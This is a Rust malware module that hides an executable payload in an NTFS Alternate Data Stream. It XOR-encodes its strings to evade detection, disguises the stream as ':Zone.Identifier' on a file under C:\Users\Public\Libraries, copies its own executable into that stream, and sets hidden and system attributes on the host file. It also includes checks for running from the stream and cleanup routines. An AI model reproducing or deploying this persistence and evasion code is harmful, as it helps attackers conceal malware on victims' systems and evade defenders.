//! # NTFS Alternate Data Streams (ADS)
//!
//! Hide payload in NTFS streams.
//! HARDENING: XOR Stack Strings. No raw literals.

use std::fs;
use std::io::{self, Read, Write};
use std::path::Path;
use log::{info, debug, warn};

// XOR Helper (Key 0x55)
fn x(bytes: &[u8]) -> String {
    let key = 0x55;
    let decoded: Vec<u8> = bytes.iter().map(|b| b ^ key).collect();
    String::from_utf8(decoded).unwrap_or_default()
}

/// Get full ADS path
pub fn get_ads_path() -> String {
    // "C:\Users\Public\Libraries\collection.dat"
    // C=43^55=16, :=3A^55=6F ... manual is hard. 
    // Let's use runtime x() for readability source, obscured binary.
    // "C:\Users\Public"
    let p1 = x(&[0x16, 0x6F, 0x09, 0x00, 0x26, 0x30, 0x27, 0x26, 0x09, 0x05, 0x20, 0x37, 0x39, 0x3C, 0x36]); 
    // "\Libraries"
    let p2 = x(&[0x09, 0x19, 0x3C, 0x37, 0x27, 0x34, 0x27, 0x3C, 0x30, 0x26]);
    // "\collection.dat"
    let p3 = x(&[0x09, 0x36, 0x3A, 0x39, 0x39, 0x30, 0x36, 0x21, 0x3C, 0x3A, 0x3B, 0x7B, 0x31, 0x34, 0x21]);
    
    let host = format!("{}{}{}", p1, p2, p3);
    
    // ":Zone.Identifier"
    let stream = x(&[0x6F, 0x0F, 0x3A, 0x3B, 0x30, 0x7B, 0x1C, 0x31, 0x30, 0x3B, 0x21, 0x3C, 0x33, 0x3C, 0x30, 0x27]);
    
    format!("{}{}", host, stream)
}

/// Install payload to ADS
pub fn install_to_ads(payload: &[u8]) -> io::Result<String> {
    let path_str = get_ads_path(); // Full stream path
    // Need host part for creating file
    let parts: Vec<&str> = path_str.split(':').collect();
    if parts.len() < 2 { return Err(io::Error::new(io::ErrorKind::InvalidInput, "Bad Path")); }
    
    // Windows path logic: C:\...:Stream -> parts[0]=C, parts[1]=\...\collection.dat (Wait, split by colon)
    // Actually Rust Path handling of streams is tricky.
    // Let's rely on string ops carefully.
    
    // Reconstruct Host: Everything before last colon
    let host_str = path_str.rsplitn(2, ':').last().unwrap_or(&path_str);
    let host = Path::new(host_str);
    
    // Ensure directory
    if let Some(parent) = host.parent() {
        fs::create_dir_all(parent)?;
    }
    
    // Create empty host file
    if !host.exists() {
        fs::File::create(host)?;
        debug!("Host created");
        set_hidden_attribute(host); // Make it hidden/system
    }
    
    // Write stream
    let mut file = fs::File::create(&path_str)?;
    file.write_all(payload)?;
    file.sync_all()?;
    
    debug!("ADS Write: {}b", payload.len());
    Ok(path_str)
}

/// Install current executable to ADS
pub fn install_self_to_ads() -> io::Result<String> {
    let exe_path = std::env::current_exe()?;
    let payload = fs::read(&exe_path)?;
    install_to_ads(&payload)
}

/// Read payload from ADS
pub fn read_from_ads() -> io::Result<Vec<u8>> {
    let ads_path = get_ads_path();
    let mut file = fs::File::open(&ads_path)?;
    let mut buffer = Vec::new();
    file.read_to_end(&mut buffer)?;
    debug!("ADS Read: {}b", buffer.len());
    Ok(buffer)
}

/// Check if running from ADS
pub fn is_running_from_ads() -> bool {
    if let Ok(path) = std::env::current_exe() {
        let s = path.to_string_lossy().to_lowercase();
        // Check for stream identifier ":zone.identifier" (encoded in xor normally, but checking string here)
        // Just check for colon count > 1 (Drive + Stream)
        if s.matches(':').count() > 1 {
            return true;
        }
    }
    false
}

/// Check if ADS payload exists
pub fn payload_exists() -> bool {
    Path::new(&get_ads_path()).exists()
}

/// Remove ADS payload
pub fn remove_ads() -> io::Result<()> {
    let path = get_ads_path();
    if Path::new(&path).exists() {
        fs::remove_file(&path)?;
        debug!("ADS Removed");
    }
    Ok(())
}

/// Remove everything
pub fn remove_all() -> io::Result<()> {
    remove_ads()?;
    // Get host path again
    let path_str = get_ads_path();
    let host_str = path_str.rsplitn(2, ':').last().unwrap_or(&path_str);
    let host = Path::new(host_str);
    
    if host.exists() {
        fs::remove_file(host)?;
        debug!("Host Removed");
    }
    Ok(())
}

// ============================================================================
// WINDOWS HELPERS
// ============================================================================

#[cfg(windows)]
fn set_hidden_attribute(path: &Path) {
    use std::os::windows::ffi::OsStrExt;
    
    #[link(name = "kernel32")]
    extern "system" {
        fn SetFileAttributesW(lpFileName: *const u16, dwFileAttributes: u32) -> i32;
    }
    
    let wide: Vec<u16> = path.as_os_str().encode_wide().chain(std::iter::once(0)).collect();
    
    unsafe {
        // FILE_ATTRIBUTE_HIDDEN (2) | FILE_ATTRIBUTE_SYSTEM (4)
        SetFileAttributesW(wide.as_ptr(), 0x02 | 0x04);
    }
}

#[cfg(not(windows))]
fn set_hidden_attribute(_path: &Path) {}
